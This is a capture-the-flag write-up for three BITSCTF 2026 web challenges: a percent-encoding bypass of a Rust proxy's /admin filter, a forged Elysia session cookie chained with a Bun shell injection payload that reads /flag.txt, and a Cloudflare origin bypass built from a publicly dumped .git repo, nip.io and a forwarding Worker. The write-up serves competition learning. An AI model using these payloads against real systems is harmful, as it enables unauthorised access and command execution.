---
title: BITSCTF Web Challenge
date: 2026-02-22 12:30:00 +0700
categories: [Web Exploitation, BITSCTF, Hard]
tags: [web, reverse-proxy, rust, flask, url-encoding, auth-bypass, elysia, bun, cookie, rce, command-injection, cloudflare, git, misconfiguration, proxy, vhost, Hard]
author: khoa
description: BITSCTF 2026
toc: true
comments: true
---

## **ALL WRITEUPS**
### Rusty Proxy
![img-description](https://i.ibb.co/t508CTv/image-2026-02-23-125821277.png)
_Website_

Target:
- `http://chals.bitskrieg.in:25001`

We are given a "highly secure" reverse proxy written in Rust, placed in front of a Flask backend. The goal is to access the admin-only flag endpoint.

---

After checking the proxy code, the core protection is basically:

- Convert the incoming path to lowercase
- Block if it starts with `/admin`

Something like:

```rust
fn is_path_allowed(path: &str) -> bool {
    let normalized = path.to_lowercase();
    if normalized.starts_with("/admin") {
        return false;
    }
    true
}
```

So, if we request:
- `/admin`
- `/admin/flag`
- `/ADMIN/anything`

=> The proxy blocks it.

---

The proxy checks the **raw request-target** string and **does NOT URL-decode** it before applying the rule.

But Flask/Werkzeug (backend) will decode percent-encoded bytes for routing.

So if we send:

- Proxy sees: `/%61dmin/flag` (this does NOT start with `/admin`)
- Backend decodes `%61` -> `a`
- Backend routes: `/admin/flag`

=> We bypass the proxy restriction.

This is a classic **inconsistent normalization / decoding** issue.

---
We just need to percent-encode **one character** in `admin`.

Easiest payload:
- `/admin/flag` -> `/%61dmin/flag`

```Using curl```
`--path-as-is` is important so curl won't normalize the path.

```bash
curl --path-as-is 'http://chals.bitskrieg.in:25001/%61dmin/flag'
```

```Using netcat (raw HTTP)```
```bash
printf 'GET /%61dmin/flag HTTP/1.1\r\nHost: chals.bitskrieg.in\r\nConnection: close\r\n\r\n' | nc chals.bitskrieg.in 25001
```

---
Response returns the flag:

`BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}`

![img-description](https://i.ibb.co/v6gpc3H5/image-2026-02-23-130035471.png)
_Flag_

### Elysia's Bakery
![img-description](https://i.ibb.co/Cs1HMBDS/image-2026-02-23-131217632.png)
_Website_

_Instancer_: `http://chals.bitskrieg.in`

Goal: become **admin** and read the flag. This chall is a clean 2-step chain:

1. **Auth bypass** (forge admin session cookie)
2. **RCE** in an admin-only endpoint (Bun shell interpolation)

---

In the source code, the server uses **Elysia** with signed cookies enabled:

```js
new Elysia({
  cookie: {
    secrets: [Bun.env.SECRET_KEY || "super_secret_key"],
    sign: ["session"],
  },
})
```

Because the chall runs **Elysia v1.4.18**, it is affected by a known issue where invalid/unsigned signed cookies can still be accepted when `secrets` is configured in the array form.

pact: I can simply forge the cookie and become admin without knowing the secret.

So I sent requests with:

```http
Cookie: session=admin
```

---

There is an admin endpoint that lists files by executing a shell command:

```js
.post("/admin/list", async ({ cookie: { session }, body }) => {
  // ... admin check ...
  const folder = body.folder;
  const result = $`ls ${folder}`.quiet();
  const output = await result.text();
  return { files: output.split("\n").filter(Boolean) };
})
```

The bug: `folder` is **fully user-controlled**, and Bun Shell supports a special object form:

- `{"raw":"..."}` → injects content **without escaping**

So I can inject `; cat /flag.txt` and read the flag in the response.

Payload:

```json
{"folder":{"raw":"/; cat /flag.txt"}}
```

---

```bash
curl -s -X POST 'http://chals.bitskrieg.in:<port>/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":"/; cat /flag.txt"}}'
```

---

`BITSCTF{c9679d1e687a1899dd25d0e9cd92ca67}`
![img-description](https://i.ibb.co/bgPNZwKN/image-2026-02-23-131428845.png)
_Flag_

---

### NetApp
![img-description](https://i.ibb.co/KxrNRhWr/image-2026-02-23-133626127.png)
_Service Portal_

Target: `https://netapp.bitskrieg.in`

The landing page lists multiple services and claims the **flag-service** is **INTERNAL** and “only accessible through vpn”.
When I tried the obvious Host-header routing trick (typical reverse-proxy/vhost bypass), Cloudflare blocked it at the edge:

```bash
curl -sk -D- https://netapp.bitskrieg.in/ -H 'Host: flag-service' | head
```

Response was **HTTP 403** with `server: cloudflare`, meaning the request never reached the origin.

---

I ran directory brute force by ```dirsearch``` and noticed something catastrophic:

- `/.git/config` → `200`
- `/.git/HEAD` → `200`
- `/.git/index` → `200`

That implies the Git repository is publicly accessible, so I can dump the entire repo from the server.

![img-description](https://i.ibb.co/8nLn4vy2/image-2026-02-23-133848615.png)
_Dirsearch_

---

I used a standard `.git` dumper to reconstruct the repository locally:

```bash
git-dumper https://netapp.bitskrieg.in/.git/ ./repo
cd repo
git log --oneline -n 20
```

![img-description](https://i.ibb.co/qFVxy37L/image-2026-02-23-134140729.png)
_Git Dump_

---

![img-description](https://i.ibb.co/Bd0rDyc/image-2026-02-23-134245150.png)
_Inside the dumped repo_

Inside the dumped repo, the Terraform/infra files revealed the real deployment:

- The origin is an EC2 instance with a **public IP**: `3.208.18.209`
- The AWS Security Group allows inbound 80/443 **only from Cloudflare IP ranges**

So the setup is basically:

> Internet → Cloudflare → Origin (only accepts Cloudflare IPs)

This explains why direct access to internal services fails.

---

A common trick is to use **Cloudflare WARP** so your outgoing IP appears to be Cloudflare.

I verified WARP is enabled:

```bash
curl -s https://1.1.1.1/cdn-cgi/trace | egrep 'ip=|warp='
```

![img-description](https://i.ibb.co/TMrCr5dz/image-2026-02-23-134414044.png)
_WARP_

It showed `warp=on`, but my exit IP was consistently `104.28.*`.
In this challenge, the SG allowlist (from the leaked Terraform) did not include that prefix, so connecting to the origin still timed out.

---

If the origin only trusts Cloudflare, then the cleanest solution is:

> run the request **from Cloudflare infrastructure** itself

A Cloudflare Worker runs inside Cloudflare’s network, so its outbound requests are “Cloudflare-sourced”.

When I tried to make the Worker fetch `http://3.208.18.209/`, Cloudflare returned:

- **Error 1003 — Direct IP access not allowed**

So I needed a hostname that resolves to the same IP.

`nip.io` (or `sslip.io`) lets you embed the IP inside a hostname that resolves back to it:

- `3.208.18.209.nip.io` → `3.208.18.209`

Now Workers can fetch it because it’s a hostname, not a raw IP.

---

I deployed a Worker that:

- forwards requests to `http://3.208.18.209.nip.io`
- sets the `Host` header to the internal vhost
- defaults `host` to `bitsctf-2026.hvijay.dev` if not specified

```js
export default {
  async fetch(request) {
    const u = new URL(request.url);

    const host = u.searchParams.get("host") || "bitsctf-2026.hvijay.dev";
    const ALLOWED = new Set([
      "bitsctf-2026.hvijay.dev",
      "netapp.bitskrieg.in",
      "flag-service",
    ]);
    if (!ALLOWED.has(host)) return new Response("bad host", { status: 400 });

    u.searchParams.delete("host");

    // Workers can't fetch raw IPs -> use nip.io/sslip.io hostname
    const ORIGIN = "3.208.18.209.nip.io";
    const target = `http://${ORIGIN}${u.pathname}${u.search}`;

    const headers = new Headers(request.headers);
    headers.set("Host", host);

    const init = { method: request.method, headers, redirect: "manual" };
    if (request.method !== "GET" && request.method !== "HEAD") init.body = request.body;

    const resp = await fetch(target, init);
    return new Response(resp.body, { status: resp.status, headers: resp.headers });
  },
};
```

![img-description](https://i.ibb.co/q3FQcDpw/image-2026-02-23-135033696.png)
_Worker_

---

After deploying the Worker, I opened the Worker URL (no parameters needed).

Because the default host is the internal vhost, the backend returned the flag immediately on `/`:

![img-description](https://i.ibb.co/9Mkqcm7/image-2026-02-23-135125961.png)
_Flag via Worker_

**Flag:**
`BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}`

---

## End

That's all for this writeup =)))
